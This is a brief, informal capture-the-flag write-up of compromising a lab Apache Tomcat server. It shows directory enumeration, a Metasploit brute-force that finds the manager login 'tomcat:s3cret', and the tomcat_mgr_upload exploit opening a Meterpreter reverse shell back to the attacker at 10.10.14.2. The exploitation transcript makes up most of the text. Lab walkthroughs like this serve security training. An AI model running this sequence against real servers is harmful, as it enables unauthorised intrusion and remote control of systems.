1. There is only one port is open I found the content that includes the webpage.
```bash
┌──(sabeshan㉿kali)-[~]
└─$ dirsearch -u http://10.10.10.95:8080/     
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                               
 (_||| _) (/_(_|| (_| )                                                                                        
                                                                                                               
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/sabeshan/reports/http_10.10.10.95_8080/__25-08-28_16-28-54.txt

Target: http://10.10.10.95:8080/

[16:28:54] Starting:                                                                                           
[16:29:16] 400 -    0B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[16:29:19] 400 -    0B  - /a%5c.aspx                                        
[16:30:16] 302 -    0B  - /docs  ->  /docs/                                 
[16:30:16] 200 -   19KB - /docs/                                            
[16:30:20] 302 -    0B  - /examples  ->  /examples/                         
[16:30:20] 200 -    1KB - /examples/                                        
[16:30:20] 200 -   17KB - /examples/jsp/index.html                          
[16:30:20] 200 -  718B  - /examples/jsp/snp/snoop.jsp                       
[16:30:20] 200 -    7KB - /examples/servlets/index.html
[16:30:20] 200 -    1KB - /examples/websocket/index.xhtml
[16:30:20] 200 -    1KB - /examples/servlets/servlet/RequestHeaderExample
[16:30:20] 200 -  637B  - /examples/servlets/servlet/CookieExample
[16:30:21] 200 -   21KB - /favicon.ico                                      
[16:30:28] 302 -    0B  - /host-manager/  ->  /host-manager/html            
[16:30:28] 401 -    2KB - /host-manager/html
[16:30:39] 302 -    0B  - /manager  ->  /manager/                           
[16:30:39] 401 -    2KB - /manager/html                                     
[16:30:39] 401 -    2KB - /manager/html/
[16:30:39] 401 -    2KB - /manager/jmxproxy
[16:30:39] 401 -    2KB - /manager/jmxproxy/?invoke=BEANNAME&op=METHODNAME&ps=COMMASEPARATEDPARAMETERS
[16:30:39] 401 -    2KB - /manager/jmxproxy/?set=BEANNAME&att=MYATTRIBUTE&val=NEWVALUE
[16:30:39] 401 -    2KB - /manager/jmxproxy/?qry=STUFF
[16:30:39] 401 -    2KB - /manager/status/all
[16:30:39] 401 -    2KB - /manager/jmxproxy/?invoke=Catalina%3Atype%3DService&op=findConnectors&ps=
[16:30:39] 401 -    2KB - /manager/jmxproxy/?get=java.lang:type=Memory&att=HeapMemoryUsage
[16:30:40] 401 -    2KB - /manager/jmxproxy/?get=BEANNAME&att=MYATTRIBUTE&key=MYKEY
[16:30:40] 404 -    2KB - /manager/admin.asp                                
[16:30:40] 404 -    2KB - /manager/VERSION                                  
[16:30:40] 404 -    2KB - /manager/login                                    
[16:30:40] 404 -    2KB - /manager/login.asp                                
[16:30:40] 302 -    0B  - /manager/  ->  /manager/html                      
[16:31:08] 302 -    0B  - /shell  ->  /shell/                               
[16:31:09] 200 -    6B  - /shell/                                           
                                                                             
Task Completed
```
===================================================
2. "msf6 auxiliary(scanner/http/tomcat_mgr_login) > " This module was use to enumerate login creds by using metasploit.
Finally credentials wass founded with these methods 
"[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret"
=======================================================
3. There is a vulnerable file upload vulnerability there
```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > search tomcat_mgr

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_deploy     2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   1    \_ target: Automatic                   .                .          .      .
   2    \_ target: Java Universal              .                .          .      .
   3    \_ target: Windows Universal           .                .          .      .
   4    \_ target: Linux x86                   .                .          .      .
   5  exploit/multi/http/tomcat_mgr_upload     2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   6    \_ target: Java Universal              .                .          .      .
   7    \_ target: Windows Universal           .                .          .      .
   8    \_ target: Linux x86                   .                .          .      .
   9  auxiliary/scanner/http/tomcat_mgr_login  .                normal     No     Tomcat Application Manager Login Utility


Interact with a module by name or index. For example info 9, use 9 or use auxiliary/scanner/http/tomcat_mgr_login

msf6 auxiliary(scanner/http/tomcat_mgr_login) > use 5
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf6 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, s
                                            apni, http, socks4
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.h
                                            tml
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.2       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
httpusername => tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set httppassword s3cret
httppassword => s3cret
msf6 exploit(multi/http/tomcat_mgr_upload) > set rhosts 10.10.10.95
rhosts => 10.10.10.95
msf6 exploit(multi/http/tomcat_mgr_upload) > set rport 8080
rport => 8080
msf6 exploit(multi/http/tomcat_mgr_upload) > set lport 1337
lport => 1337
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
[*] Started reverse TCP handler on 10.10.14.2:1337 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying vLq9...
[*] Executing vLq9...
[*] Sending stage (58073 bytes) to 10.10.10.95
[*] Undeploying vLq9 ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.10.14.2:1337 -> 10.10.10.95:49195) at 2025-08-28 16:52:52 +0530

meterpreter > shell
Process 1 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\apache-tomcat-7.0.88

06/19/2018  04:07 AM    <DIR>          .
06/19/2018  04:07 AM    <DIR>          ..
06/19/2018  04:06 AM    <DIR>          bin
06/19/2018  06:47 AM    <DIR>          conf
06/19/2018  04:06 AM    <DIR>          lib
05/07/2018  02:16 PM            57,896 LICENSE
08/28/2025  08:16 PM    <DIR>          logs
05/07/2018  02:16 PM             1,275 NOTICE
05/07/2018  02:16 PM             9,600 RELEASE-NOTES
05/07/2018  02:16 PM            17,454 RUNNING.txt
08/28/2025  09:23 PM    <DIR>          temp
08/28/2025  09:23 PM    <DIR>          webapps
06/19/2018  04:34 AM    <DIR>          work
               4 File(s)         86,225 bytes
               9 Dir(s)   2,418,315,264 bytes free

C:\apache-tomcat-7.0.88>cd C:\users
cd C:\users

C:\Users>idr
idr
'idr' is not recognized as an internal or external command,
operable program or batch file.

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users

06/18/2018  11:31 PM    <DIR>          .
06/18/2018  11:31 PM    <DIR>          ..
06/18/2018  11:31 PM    <DIR>          Administrator
08/22/2013  06:39 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   2,418,315,264 bytes free
```
with that file upload using metasploit i can gain the control form this.
------------------------------------------------------------------------------------
There is no esaclation with this machine, there is direct access to root.
